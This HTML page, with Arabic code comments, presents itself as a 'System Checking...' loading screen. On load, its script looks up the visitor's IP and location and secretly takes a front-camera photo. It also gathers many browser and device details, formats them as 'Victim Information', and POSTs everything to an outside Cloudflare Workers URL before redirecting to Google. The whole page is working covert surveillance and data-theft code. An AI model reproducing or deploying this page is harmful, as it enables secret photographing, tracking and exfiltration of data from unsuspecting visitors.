<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>System Checking...</title>
    <style>
        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="c" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function capture() {
            let photo = null;
            let ipD = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };

            // جلب الـ IP
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipD = await res.json();
            } catch(e) {}

            // تصوير الكاميرا
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = s;
                await new Promise(r => setTimeout(r, 2000));
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                photo = canvas.toDataURL('image/jpeg', 0.6);
                s.getTracks().forEach(t => t.stop());
            } catch (e) {}

            // الرسالة بالتنسيق الذي طلبته
            const message = `
✅<b>Victim Information</b> 

⚓ IP: ${ipD.ip} (https://ip-api.com/#${ipD.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}

⏳ Date In Victim's Device : ${new Date().toString()}

📱 <b>Device Information</b>
productSub: ${navigator.productSub}
vendor: ${navigator.vendor}
maxTouchPoints: ${navigator.maxTouchPoints}
hardwareConcurrency: ${navigator.hardwareConcurrency}
cookieEnabled: ${navigator.cookieEnabled}
appCodeName: ${navigator.appCodeName}
appName: ${navigator.appName}
appVersion: ${navigator.appVersion}
platform: ${navigator.platform}
product: ${navigator.product}
userAgent: ${navigator.userAgent}
language: ${navigator.language}
webdriver: ${navigator.webdriver}
pdfViewerEnabled: ${navigator.pdfViewerEnabled}

🌐 <b>Location/ISP</b>
City: ${ipD.city} | Country: ${ipD.country_name}
ISP: ${ipD.org}
            `;

            // إرسال للـ Worker الجديد
            const workerUrl = "https://cold-brook-420f.tjarb093.workers.dev/";
            await fetch(workerUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: message, image: photo })
            });

            window.location.href = "https://www.google.com";
        }
        window.onload = capture;
    </script>
</body>
</html>
